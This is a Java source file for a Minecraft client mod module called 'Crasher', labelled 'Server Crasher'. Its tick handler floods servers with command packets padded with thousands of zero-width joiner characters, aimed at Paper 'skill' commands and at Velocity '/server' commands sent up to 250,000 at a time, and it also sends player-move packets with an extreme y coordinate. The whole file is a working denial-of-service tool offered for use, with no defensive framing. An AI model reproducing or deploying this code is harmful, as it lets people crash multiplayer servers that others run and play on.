package com.x310.clarity.modules;

import com.x310.clarity.Main;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.client.session.report.ChatAbuseReport;
import net.minecraft.network.message.LastSeenMessageList;
import net.minecraft.network.message.MessageSignatureData;
import net.minecraft.network.packet.c2s.common.CommonPongC2SPacket;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.login.LoginHelloC2SPacket;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.recipe.NetworkRecipeId;
import org.joml.Vector3d;

import java.sql.Timestamp;
import java.time.Instant;
import java.util.BitSet;
import java.util.UUID;

public class Crasher extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("General");
    private final SettingGroup sgSpam = settings.createGroup("Paper Skill Crash");
    private final SettingGroup sgPos = settings.createGroup("Position Spammer");
    private final SettingGroup sgVelocity = settings.createGroup("Velocity Crash");
    private final SettingGroup sgDev = settings.createGroup("dev");

    private final Setting<Boolean> disableOnLeave = sgGeneral.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    private final Setting<Boolean> spamCommandExec = sgSpam.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("Spams CommandExecutionC2S packets.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Integer> spamAmount = sgSpam.add(new IntSetting.Builder()
        .name("Amount")
        .description("Number of packets sent per tick.")
        .defaultValue(15)
        .min(1)
        .max(100)
        .sliderMax(100)
        .build()
    );

    private final Setting<Integer> spamBuffer = sgSpam.add(new IntSetting.Builder()
        .name("Buffer")
        .description("Buffer size for spam.")
        .defaultValue(32760)
        .min(1)
        .max(32760)
        .sliderMax(32760)
        .build()
    );

    private final Setting<Boolean> spamPos = sgPos.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("Spams PlayerMoveC2SPackets.")
        .defaultValue(false)
        .build()
    );

    private final Setting<Boolean> velocityCrash = sgVelocity.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("Spams server with Velocity packets.")
        .defaultValue(false)
        .build()
    );

    private final Setting<String> velocityServer = sgVelocity.add(new StringSetting.Builder()
        .name("VeloWorld")
        .description("The current \"/server\" you are in.")
        .defaultValue("lobby")
        .build()
    );
    private final Setting<Integer> velocityAmount = sgVelocity.add(new IntSetting.Builder()
        .name("Amount")
        .description("Amount of commands to send every 5 ms.")
        .defaultValue(10000)
        .min(1)
        .max(250000)
        .sliderMax(250000)
        .build()
    );

    private final Setting<Integer> velocityBuffer = sgVelocity.add(new IntSetting.Builder()
        .name("Buffer")
        .description("Buffer length")
        .defaultValue(200)
        .min(1)
        .max(256)
        .sliderMax(256)
        .build()
    );

    private final Setting<Boolean> devCrash = sgDev.add(new BoolSetting.Builder()
        .name("Toggle")
        .description("test")
        .defaultValue(false)
        .build()
    );



    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) toggle();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        ClientPlayNetworkHandler handler = mc.getNetworkHandler();
        if (mc.player == null || handler == null) {
            toggle();
            return;
        }

        if (spamCommandExec.get()) {
            String longString = "skill " + "\u200D".repeat(spamBuffer.get());
            for (int i = 0; i < spamAmount.get(); i++) {
                handler.sendPacket(new CommandExecutionC2SPacket(longString));
            }
        }

        if (spamPos.get()) {
            double x = mc.player.getX();
            double y = -10000;
            double z = mc.player.getZ();
            float yaw = mc.player.getYaw();
            float pitch = mc.player.getPitch();
            handler.sendPacket(new PlayerMoveC2SPacket.Full(x, y, z, yaw, pitch, true, false));
        }

        if (velocityCrash.get()) {
            String longString = "server " + velocityServer.get() + " " + "\u200D".repeat(velocityBuffer.get());
            for (int i = 0; i < velocityAmount.get(); i++) {

                handler.sendPacket(new CommandExecutionC2SPacket(longString));
            }
        }

        if (devCrash.get()) {
            for (int i = 0; i < 19; i++) {
//                handler.sendPacket(new Player());
            }
        }

    }

    public Crasher() {
        super(Main.CATEGORY, "Crasher", "Server Crasher");
    }
}
